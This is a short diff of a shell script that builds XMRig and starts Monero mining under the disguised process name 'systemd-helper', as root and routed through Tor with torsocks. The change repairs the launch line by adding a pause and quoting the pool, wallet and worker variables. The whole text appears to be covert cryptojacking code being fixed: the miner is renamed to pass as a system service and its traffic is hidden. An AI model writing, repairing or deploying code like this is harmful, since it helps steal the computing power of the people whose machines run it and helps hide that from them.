@@ -127,7 +127,9 @@ build_xmrig() {
 
 start_mining() {
     chmod +x ./systemd-helper
-    mkdir -p /root/.tor && tor & && torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
+#    mkdir -p /root/.tor && tor & && torsocks ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --donate-level=1
+     mkdir -p /root/.tor && tor & sleep 5 && torsocks ./systemd-helper -o "$POOL" -u "$WALLET" -p "$WORKER" -k --coin monero --donate-level=1
+
 }
 
 if [ ! -f "./systemd-helper" ]; then
